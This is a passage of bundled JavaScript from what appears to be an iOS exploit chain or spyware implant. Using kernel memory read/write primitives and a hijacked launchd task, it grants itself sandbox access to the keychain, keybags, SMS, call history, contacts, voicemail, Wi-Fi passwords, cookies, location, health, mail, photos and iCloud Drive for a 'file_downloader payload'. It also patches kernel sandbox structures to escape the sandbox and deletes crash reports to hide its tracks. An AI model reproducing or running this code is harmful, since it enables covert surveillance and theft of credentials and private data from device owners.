		"/var/keybags/backup/backup_keys_cache.sqlite":0,
		"/private/var/preferences/com.apple.wifi.known-networks.plist":0,
		"/private/var/preferences/SystemConfiguration/":0,
		"/private/var/preferences/SystemConfiguration/preferences.plist":0,
		"/private/var/preferences/SystemConfiguration/com.apple.wifi.plist":0,
		"/private/var/preferences/SystemConfiguration/com.apple.wifi-private-mac-networks.plist":0,
		"/private/var/networkd/db/":0,
		"/var/wireless/":0,
		"/private/var/wireless/":0,
		"/var/wireless/Library/":0,
		"/var/wireless/Library/Caches/":0,
		"/var/wireless/Library/Preferences/":0,
		"/var/wireless/Library/Databases/":0,
		"/var/wireless/Library/ControlCenter/":0,
		"/private/var/wireless/Library/":0,
		"/private/var/wireless/Library/Preferences/":0,
		"/private/var/wireless/Library/Databases/":0,
		"/private/var/wireless/Library/ControlCenter/":0,
		"/private/var/mobile/Library/CoreDuet/":0,
		"/private/var/mobile/Library/CoreDuet/People/":0,
		"/private/var/mobile/Library/PersonalizationPortrait/":0,
		"/var/log/":0,
		"/private/var/log/":0,
		"/var/db/":0,
		"/private/var/db/":0,
		"/var/run/":0,
		"/private/var/run/":0,
		
		// Personal Data
		"/private/var/mobile/Library/Notes/":0,
		"/private/var/mobile/Library/Health/":0,
		"/private/var/mobile/Media/":0,
		"/private/var/mobile/Media/PhotoData/":0,
		"/private/var/mobile/Media/DCIM/":0,
		"/var/mobile/Media/":0,
		"/var/mobile/Media/PhotoData/":0,
		"/var/mobile/Media/DCIM/":0,
		
		// Device Info
		"/private/var/root/Library/Lockdown/":0,
		"/private/var/mobile/Library/Preferences/":0,
		"/private/var/mobile/Library/Preferences/com.apple.commcenter.shared.plist":0,
		"/private/var/mobile/Library/Preferences/com.apple.identityservices.idstatuscache.plist":0,
		
		// Accounts
		"/private/var/mobile/Library/Accounts/":0,
		
		// Protected & Trust
		"/private/var/protected/trustd/private/":0,
		"/private/var/protected/trustd/private":0,
		
		// System & Apps
		"/bin/":0,
		"/Applications/":0,
		"/private/var/containers/Bundle/Application/":0,
		"/var/containers/Bundle/Application/":0,
		"/private/var/containers/Shared/SystemGroup/":0,
		"/private/var/mobile/Containers/Data/Application/":0,
		"/var/mobile/Containers/Data/Application/":0,
		"/private/var/mobile/Containers/Shared/AppGroup/":0,
		
		// Notifications & Logs
		"/private/var/mobile/Library/UserNotificationsUI/NotificationListPersistentState.json":0,
		"/private/var/mobile/Library/UserNotifications/":0,
		"/private/var/mobile/Library/Logs/CrashReporter/":0,
		"/private/var/mobile/Library/ExternalAccessory":0,
		"/private/var/mobile/Library/Shortcuts/":0,
		
		// Temp directory for file operations
		"/private/var/tmp/":0,
		"/tmp/":0
		/* not allowed via launchd
		"/private/var/mobile/Library/CoreDuet/Knowledge/knowledgeC.db":0,
		"/private/var/mobile/Library/CoreDuet/Knowledge/knowledgeC.db-wal":0,
		"/private/var/mobile/Library/CoreDuet/Knowledge/knowledgeC.db-shm":0
		*/
	};

	static initWithLaunchdTask(launchdTask) {
		this.#launchdTask = launchdTask;
	}

	static getTokenForPath(path, consume=false)
	{

		if (!this.#launchdTask || !this.#launchdTask.success())
			return;

		//console.log(TAG,`Creating token for path:${path}`);
		let memRemote = this.#launchdTask.mem();
		let pathRemote = memRemote;
		this.#launchdTask.writeStr(pathRemote,path);
		let appSandboxReadExt = "com.apple.app-sandbox.read-write";
		let sandboxExtensionEntry = memRemote + 0x100n;
		this.#launchdTask.writeStr(sandboxExtensionEntry,appSandboxReadExt);
		let tokenRemote = this.#launchdTask.call(100, "sandbox_extension_issue_file",sandboxExtensionEntry,pathRemote,0n,0n);
		if (!tokenRemote) {
			console.log(TAG, "Unable to create token for: " + path);
			return null;
		}
		//console.log(TAG,`token:${Utils.hex(tokenRemote)}`);
		let token = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].mem;
		this.#launchdTask.read(tokenRemote,token,512n);
		if(consume)
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("sandbox_extension_consume",token);
		token = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].readString(token,512);
		//console.log(TAG,`token:${token}`);
		if(!token || !token.includes("com.apple.app-sandbox.read-write"))
		{
			console.log(TAG,`Found weird token:${token}, not registering`);
			return null;
		}
		return token;
	}

	static createTokens()
	{
		console.log(TAG, "Create tokens...");
		let keys = Object.keys(this.#PathDictionary);
		for(let key of keys)
			this.#PathDictionary[key] = this.getTokenForPath(key,false);

		// Those are required for Bailer
		//if (!this.#weAreLaunchd) {
			this.getTokenForPath("/bin/", true);
			this.getTokenForPath("/Applications/", true);
			this.getTokenForPath("/private/var/tmp/", true);
			this.getTokenForPath("/tmp/", true);
			this.getTokenForPath("/private/var/mobile/Media/", true);
			this.getTokenForPath("/private/var/mobile/Containers/Data/Application/", true);
			this.getTokenForPath("/var/mobile/Containers/Data/Application/", true);
			this.getTokenForPath("/private/var/mobile/Containers/Shared/AppGroup/", true);
			this.getTokenForPath("/private/var/containers/Bundle/Application/", true);
			this.getTokenForPath("/var/containers/Bundle/Application/", true);
			this.getTokenForPath("/private/var/containers/Shared/SystemGroup/", true);
			this.getTokenForPath("/private/var/preferences/SystemConfiguration/preferences.plist", true);
			this.getTokenForPath("/private/var/protected/trustd/private/TrustStore.sqlite3", true);
			this.getTokenForPath("/private/var/protected/trustd/private/TrustStore.sqlite3-wal", true);
			this.getTokenForPath("/private/var/protected/trustd/private/TrustStore.sqlite3-shm", true);
		//}
		
		// Forensic file paths for file_downloader payload
		console.log(TAG, "Create tokens for forensic paths...");
		this.getTokenForPath("/private/var/mobile/Library/SMS/", true);
		this.getTokenForPath("/private/var/mobile/Library/CallHistoryDB/", true);
		this.getTokenForPath("/private/var/mobile/Library/AddressBook/", true);
		this.getTokenForPath("/private/var/mobile/Library/Voicemail/", true);
		
		// Keychain tokens (with /private prefix)
		this.getTokenForPath("/private/var/Keychains/", true);
		this.getTokenForPath("/private/var/Keychains/keychain-2.db", true);
		this.getTokenForPath("/private/var/Keychains/keychain-2.db-shm", true);
		this.getTokenForPath("/private/var/Keychains/keychain-2.db-wal", true);
		this.getTokenForPath("/private/var/Keychains/keychain-2.db-journal", true);
		
		// Keychain tokens (without /private prefix - alternate)
		this.getTokenForPath("/var/Keychains/", true);
		this.getTokenForPath("/var/Keychains/keychain-2.db", true);
		this.getTokenForPath("/var/Keychains/keychain-2.db-shm", true);
		this.getTokenForPath("/var/Keychains/keychain-2.db-wal", true);
		this.getTokenForPath("/var/Keychains/keychain-2.db-journal", true);
		
		// Keybag tokens (legacy location)
		this.getTokenForPath("/private/var/keybags/", true);
		this.getTokenForPath("/private/var/keybags/systembag.kb", true);
		this.getTokenForPath("/private/var/keybags/persona.kb", true);
		this.getTokenForPath("/private/var/keybags/usersession.kb", true);
		this.getTokenForPath("/private/var/keybags/backup/", true);
		
		// Keybag tokens (without /private - alternate)
		this.getTokenForPath("/var/keybags/", true);
		this.getTokenForPath("/var/keybags/systembag.kb", true);
		this.getTokenForPath("/var/keybags/persona.kb", true);
		this.getTokenForPath("/var/keybags/usersession.kb", true);
		this.getTokenForPath("/var/keybags/backup/", true);
		this.getTokenForPath("/var/keybags/backup/backup_keys_cache.sqlite", true);
		
		// Keybag tokens (Keychains directory - iOS 18)
		this.getTokenForPath("/private/var/Keychains/System.keybag", true);
		this.getTokenForPath("/private/var/Keychains/Backup.keybag", true);
		this.getTokenForPath("/private/var/Keychains/persona.kb", true);
		this.getTokenForPath("/private/var/Keychains/usersession.kb", true);
		this.getTokenForPath("/private/var/Keychains/device.kb", true);
		this.getTokenForPath("/var/Keychains/persona.kb", true);
		
		this.getTokenForPath("/private/var/preferences/SystemConfiguration/com.apple.wifi.plist", true);
		this.getTokenForPath("/private/var/preferences/SystemConfiguration/com.apple.wifi-private-mac-networks.plist", true);
		this.getTokenForPath("/private/var/preferences/com.apple.wifi.known-networks.plist", true);
		
		// WiFi password file locations (for pickup from wifid)
		this.getTokenForPath("/var/wireless/", true);
		this.getTokenForPath("/private/var/wireless/", true);
		this.getTokenForPath("/private/var/wireless/Library/", true);
		this.getTokenForPath("/private/var/wireless/Library/Preferences/", true);
		this.getTokenForPath("/private/var/wireless/Library/Databases/", true);
		this.getTokenForPath("/private/var/wireless/Library/ControlCenter/", true);
		this.getTokenForPath("/private/var/mobile/Library/CoreDuet/", true);
		this.getTokenForPath("/private/var/mobile/Library/PersonalizationPortrait/", true);
		this.getTokenForPath("/var/log/", true);
		this.getTokenForPath("/private/var/log/", true);
		this.getTokenForPath("/var/db/", true);
		this.getTokenForPath("/private/var/db/", true);
		this.getTokenForPath("/var/run/", true);
		this.getTokenForPath("/private/var/run/", true);
		this.getTokenForPath("/private/var/networkd/", true);
		
		this.getTokenForPath("/private/var/mobile/Library/Safari/", true);
		this.getTokenForPath("/private/var/mobile/Library/Cookies/", true);
		this.getTokenForPath("/private/var/mobile/Library/Caches/locationd/", true);
		this.getTokenForPath("/private/var/root/Library/Caches/locationd/", true);
		this.getTokenForPath("/private/var/mobile/Library/Notes/", true);
		this.getTokenForPath("/private/var/mobile/Library/Calendar/", true);
		this.getTokenForPath("/private/var/mobile/Media/PhotoData/", true);
		this.getTokenForPath("/private/var/mobile/Media/DCIM/", true);
		this.getTokenForPath("/var/mobile/Media/", true);
		
		// iCloud Drive tokens
		this.getTokenForPath("/private/var/mobile/Library/Mobile Documents/", true);
		this.getTokenForPath("/private/var/mobile/Library/Mobile Documents/com~apple~CloudDocs/", true);
		this.getTokenForPath("/var/mobile/Media/PhotoData/", true);
		this.getTokenForPath("/var/mobile/Media/DCIM/", true);
		this.getTokenForPath("/private/var/mobile/Library/Health/", true);
		this.getTokenForPath("/private/var/root/Library/Lockdown/", true);
		this.getTokenForPath("/private/var/mobile/Library/Preferences/", true);
		this.getTokenForPath("/private/var/mobile/Library/Accounts/", true);
		this.getTokenForPath("/private/var/mobile/Library/Mail/", true);
		this.getTokenForPath("/private/var/mobile/Library/FrontBoard/", true);
	}

	static applyTokensForRemoteTask(remoteTask)
	{
		let remoteMem = remoteTask.mem();
		let keys = Object.keys(this.#PathDictionary);
		for(let key of keys)
		{
			if(this.#PathDictionary[key])
			{
				//console.log(TAG,`Applying:${this.#PathDictionary[key]}`);
				remoteTask.writeStr(remoteMem,this.#PathDictionary[key]);
				remoteTask.call(100,"sandbox_extension_consume",remoteMem);
				//console.log(TAG,`Result of consume:${resConsume}`);
			}
		}
	}

	static destroy()
	{
		if(this.#launchdTask)
			this.#launchdTask.destroy();
	}

	static deleteCrashReports()
	{
		this.getTokenForPath("/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.osanalytics/DiagnosticReports/",true);
		libs_JSUtils_FileUtils__WEBPACK_IMPORTED_MODULE_0__["default"].deleteDir("/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.osanalytics/DiagnosticReports/",true);
	}

	static adjustMemoryPressure(processName) {
		const MEMORYSTATUS_CMD_SET_JETSAM_HIGH_WATER_MARK = 5;
		const MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT = 6;
		const MEMORYSTATUS_CMD_SET_PROCESS_IS_MANAGED = 16;

		let pid = _Task__WEBPACK_IMPORTED_MODULE_2__["default"].pidof(processName);
		if (!pid) {
			console.log(TAG, "Unable to get pid of: " + processName);
			return;
		}

		if (!this.#launchdTask || !this.#launchdTask.success())
			return;

		let memResult = this.#launchdTask.call(100, "memorystatus_control",MEMORYSTATUS_CMD_SET_JETSAM_HIGH_WATER_MARK,pid,-1,0,0);
		console.log(TAG,`waterMark result: ${memResult}`);
		memResult = this.#launchdTask.call(100, "memorystatus_control",MEMORYSTATUS_CMD_SET_PROCESS_IS_MANAGED,pid,0,0,0);
		console.log(TAG,`isManaged result: ${memResult}`);
		memResult = this.#launchdTask.call(100, "memorystatus_control",MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT,pid,0,0,0);
		console.log(TAG,`taskLimit result: ${memResult}`);
	}
	static applySandboxEscape() {
		let _CS_DARWIN_USER_TEMP_DIR = 65537n;
		let write_file_path = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("calloc", 1n, 1024n);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("confstr", _CS_DARWIN_USER_TEMP_DIR, write_file_path, 1024n);
		let randomHex = "/" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("arc4random"));
		let randomHexPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].writeString(randomHexPtr, randomHex);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("strcat", write_file_path, randomHexPtr);

		// mktmp should work
		// confstrr path
		// also in pe
		//let procPath = "/private/var/tmp/com.apple.mediaplaybackd/Library/HTTPStorages/com.apple.mediaplaybackd/"
		let appSandboxReadExt = "com.apple.app-sandbox.read-write";
		let extension = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("sandbox_extension_issue_file",appSandboxReadExt,write_file_path,0n,0n);
		if (!extension) {
			console.log(TAG,`Sandbox failure 1`);
			return false;
		}
		let resConsume = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("sandbox_extension_consume",extension);
		if (resConsume == -1) {
			console.log(TAG,`Sandbox failure 2`);
			return false;
		}
		let ourTaskAddr = _Task__WEBPACK_IMPORTED_MODULE_2__["default"].getTaskAddrByPID(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("getpid"));
		console.log(TAG,`ourTaskAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(ourTaskAddr)}`);
		let ourProcAddr = _Task__WEBPACK_IMPORTED_MODULE_2__["default"].getTaskProc(ourTaskAddr);
		console.log(TAG,`ourProcAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(ourProcAddr)}`);
		let credRefAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ourProcAddr + 0x18n);
		if (credRefAddr == 0n) {
			console.log(TAG,`Sandbox failure 3`);
			return false;
		}
		credRefAddr = credRefAddr + 0x28n;
		let credAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(credRefAddr);
		if (credAddr == 0n) {
			console.log(TAG,`Sandbox failure 4`);
			return false;
		}
		console.log(TAG,`credRefAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(credRefAddr)}`);
		let labelAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(credAddr + 0x78n);
		if (labelAddr == 0n) {
			console.log(TAG,`Sandbox failure 5`);
			return false;
		}
		console.log(TAG,`labelAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(labelAddr)}`);
		let sandboxAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(labelAddr + 0x8n + 1n * BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].UINT64_SIZE));
		if (sandboxAddr == 0n) {
			console.log(TAG,`Sandbox failure 6`);
			return false;
		}
		console.log(TAG,`sandboxAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(sandboxAddr)}`);
		let ext_setAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(sandboxAddr + 0x10n);
		if (ext_setAddr == 0n) {
			console.log(TAG,`Sandbox failure 7`);
			return false;
		}
		console.log(TAG,`ext_setAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(ext_setAddr)}`);
		let ext_tableAddr = ext_setAddr + 0x0n; // koffsetof(extension_set, ext_table) = 0x0
		let hash = 0n;
		console.log(TAG,`hash:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(hash)}`);
		//hash = 4n; // for read
		hash = 0n; // for read-write
		let ext_hdrAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ext_tableAddr + hash * BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].UINT64_SIZE));
		if (ext_hdrAddr == 0n) {
			console.log(TAG,`Sandbox failure 8`);
			return false;
		}
		/*
		newHash = hashing_magic(appSandboxReadWriteExt);
		LOG("ext_hdrAddr:%llx",ext_hdrAddr);
		sleep(1);
		mach_vm_address_t nullAddr = 0;
		chain_write(ext_tableAddr + hash * sizeof(mach_vm_address_t),&nullAddr,sizeof(nullAddr));
		chain_write(ext_tableAddr + newHash * sizeof(mach_vm_address_t),&ext_hdrAddr,sizeof(ext_hdrAddr));
		*/
		for (;;) {
			let nextAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ext_hdrAddr);
			if(nextAddr == 0n)
				break;
			ext_hdrAddr = nextAddr;
		}
		let ext_lstAddr = ext_hdrAddr + 0x8n; // koffsetof(extension_hdr, ext_lst) == 0x8
		let extAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ext_lstAddr);
		if (extAddr == 0n) {
			console.log(TAG,`Sandbox failure 9`);
			return false;
		}
		console.log(TAG,`extAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(extAddr)}`);
		let dataLength = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(extAddr + 0x48n);
		let dataAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(extAddr + 0x40n);
		if(dataLength == 0n || dataAddr == 0n) {
			console.log(TAG,`Sandbox failure 10`);
			return false;
		}
		let pathLength = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("strlen",write_file_path) + 1;
		console.log(TAG,`dataLength:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(dataLength)} pathLength:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(pathLength)}`);

		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].write8(dataAddr, 0);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].write64(extAddr + 0x48n,0n);

		console.log(TAG, `Finished succesfully`);

		return true;
	}
}


/***/ }),

/***/ "./src/libs/TaskRop/SelfTaskStruct.js":
/*!********************************************!*\
  !*** ./src/libs/TaskRop/SelfTaskStruct.js ***!
  \********************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ SelfTaskStruct)
/* harmony export */ });
class SelfTaskStruct 
{
	#buffer;
	#dataView;
	constructor()
	{
		this.#buffer = new ArrayBuffer(32);
		this.#dataView = new DataView(this.#buffer);
		this.addr = 0x0n;
		this.spaceTable = 0x0n;
		this.portObject = 0x0n;
		this.launchdTask = 0x0n;
	}
	get addr()
	{
		return this.#dataView.getBigUint64(0,true);
	}
	set addr(value)
	{
		this.#dataView.setBigUint64(0,value,true);
	}
	get spaceTable()
	{
		return this.#dataView.getBigUint64(8,true);
	}
	set spaceTable(value)
	{
		this.#dataView.setBigUint64(8,value,true);
	}
	get portObject()
	{
		return this.#dataView.getBigUint64(16,true);
	}
	set portObject(value)
	{
		this.#dataView.setBigUint64(16,value,true);
	}
	get launchdTask()
	{
		return this.#dataView.getBigUint64(24,true);
	}
	set launchdTask(value)
	{
		this.#dataView.setBigUint64(24,value,true);
	}
}

/***/ }),

/***/ "./src/libs/TaskRop/Task.js":
/*!**********************************!*\
  !*** ./src/libs/TaskRop/Task.js ***!
  \**********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Task)
/* harmony export */ });
/* harmony import */ var _SelfTaskStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./SelfTaskStruct */ "./src/libs/TaskRop/SelfTaskStruct.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");


const TAG = "TASK"
const TASK_EXC_GUARD_MP_CORPSE = 0x40;
const TASK_EXC_GUARD_MP_FATAL = 0x80;
const TASK_EXC_GUARD_MP_DELIVER = 0x10;

class Task
{
	static gSelfTask;
	static KALLOC_ARRAY_TYPE_SHIFT;

	static {
		this.gSelfTask = new _SelfTaskStruct__WEBPACK_IMPORTED_MODULE_0__["default"]();
	}

	static init(selfTaskAddr)
	{
		// Update KALLOC_ARRAY_TYPE_SHIFT
		this.KALLOC_ARRAY_TYPE_SHIFT = BigInt((64n - libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().T1SZ_BOOT - 1n));

		/*
		 * This function should be invoked as the initializer of the this Task utility.
		 * It setups the global var "gSelfTask" containing values used all across the task functions to lookup ports.
		 * It also retrieves the "launchd" task address.
		 */
		this.gSelfTask.addr = selfTaskAddr;
		let spaceTable = this.#getSpaceTable(this.gSelfTask.addr);
		this.gSelfTask.portObject = this.#getPortObject(spaceTable, 0x203n);
		this.gSelfTask.launchdTask = this.#searchForLaunchdTask();

		console.log(TAG,`Self task address: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(this.gSelfTask.addr)}`);
		console.log(TAG,`Self task space table: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(spaceTable)}`);
		console.log(TAG,`Self task port object: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(this.gSelfTask.portObject)}`);
		console.log(TAG,`launchd task: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(this.gSelfTask.launchdTask)}`);
	}

	static trunc_page(addr)
	{
		return addr & (~(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].PAGE_SIZE - 1n));
	}

	static round_page(addr)
	{
		return this.trunc_page((addr) + (libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].PAGE_SIZE - 1n));
	}

	static pidof(name)
	{
		let currTask = this.gSelfTask.launchdTask;
		while (true)
		{
			let procAddr = this.getTaskProc(currTask);
			let command = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem;
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pComm, command, 18);
			let resultName = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].readString(command,18);
			if(name === resultName)
			{
				let pid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pid);
				return pid;
			}
			let nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().nextTask);
			if (!nextTask || nextTask == currTask)
				break;
			currTask = nextTask;
		}
		return 0;
	}

	static getTaskAddrByPID(pid)
	{
		let currTask = this.gSelfTask.launchdTask;

		while (true)
		{
			let procAddr = this.getTaskProc(currTask);
			let currPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pid);
			if (currPid == pid)
				return currTask;
			let nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().nextTask);
			if (!nextTask || (nextTask == currTask))
				break;
			currTask = nextTask;
		}
		return 0;
	}

	static disableExcGuardKill(taskAddr)
	{
		// in mach_port_guard_ast, the victim would crash if these are on.
		let excGuard = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read32(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().excGuard);
		//console.log(TAG,`Current excGuard:0x${Utils.hex(excGuard)}`);
		excGuard &= ~(TASK_EXC_GUARD_MP_CORPSE | TASK_EXC_GUARD_MP_FATAL);
		excGuard |= TASK_EXC_GUARD_MP_DELIVER;
		//console.log(TAG,`ExcGuard result:0x${Utils.hex(excGuard)}`);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].write32(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().excGuard, excGuard);
	}

	static getTaskAddrByName(name)
	{
		let currTask = this.gSelfTask.launchdTask;
		while (true)
		{
			let procAddr = this.getTaskProc(currTask);
			let command = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem;
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pComm, command, 18);
			let resultName = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].readString(command,18);
			//console.log(TAG, `${Utils.hex(procAddr)}: ${resultName}`);
			if(name === resultName)
			{
				//console.log(TAG, `Found target process: ${name}`);
				return currTask;
			}
			let nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().nextTask);
			if (!nextTask || nextTask == currTask)
				break;
			currTask = nextTask;
		}
		return false;
	}

	static getRightAddr(port)
	{
		let spaceTable = this.#getSpaceTable(this.gSelfTask.addr);
		return this.#getPortEntry(spaceTable, port);
	}

	static #getSpaceTable(taskAddr)
	{
		let space = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().ipcSpace);
		let spaceTable = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(space + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().spaceTable);
		//console.log(TAG,`space: ${Utils.hex(space)}`);
		//console.log(TAG,`spaceTable: ${Utils.hex(spaceTable)}`);
		spaceTable = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].strip(spaceTable);
		//console.log(TAG,`spaceTable: ${Utils.hex(spaceTable)}`);
		return this.#kallocArrayDecodeAddr(BigInt(spaceTable));
	}

	static #mach_port_index(port)
	{
		return ((port) >> 8n);
	}

	static #getPortEntry(spaceTable, port)
	{
		let portIndex = this.#mach_port_index(port);
		return spaceTable + (portIndex * 0x18n);
	}

	static #getPortObject(spaceTable, port)
	{
		//console.log(TAG, `getPortObject(): space=${Utils.hex(spaceTable)}, port=${Utils.hex(port)}`);
		let portEntry = this.#getPortEntry(spaceTable, port);
		//console.log(TAG,`portEntry: ${Utils.hex(portEntry)}`);
		let portObject = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(portEntry + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().entryObject);
		//console.log(TAG,`portObject:${Utils.hex(portObject)}`);
		return libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].strip(portObject);
	}

	static getTaskProc(taskAddr)
	{
		let procROAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().procRO);
		let procAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(procROAddr);
		return procAddr;
	}

	static #searchForLaunchdTask()
	{
		/*
		 * Traverse the tasks list backwards starting from the self task until we find the proc with PID 1.
		 */

		let currTask = this.gSelfTask.addr;
		while (true)
		{
			let procAddr = this.getTaskProc(currTask);
			let currPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pid);
			if (currPid == 1)
				return currTask;
			let prevTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().prevTask);
			if (!prevTask || prevTask === currTask)
				break;
			currTask = prevTask;
		}
		return 0n;
	}

	static #kallocArrayDecodeAddr(ptr)
	{
		let zone_mask = BigInt(1) << BigInt(this.KALLOC_ARRAY_TYPE_SHIFT);
		if (ptr & zone_mask)
		{
			ptr &= ~0x1fn;
		}
		else
		{
			ptr &= ~libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].PAGE_MASK;
			//console.log(TAG,`ptr:${Utils.hex(ptr)}`);
			ptr |= zone_mask;
			//console.log(TAG,`ptr2:${Utils.hex(ptr)}`);
		}
		return ptr;
	}

	static getPortAddr(port)
	{
		if (!port)
			return 0;
		let spaceTable = this.#getSpaceTable(this.gSelfTask.addr);
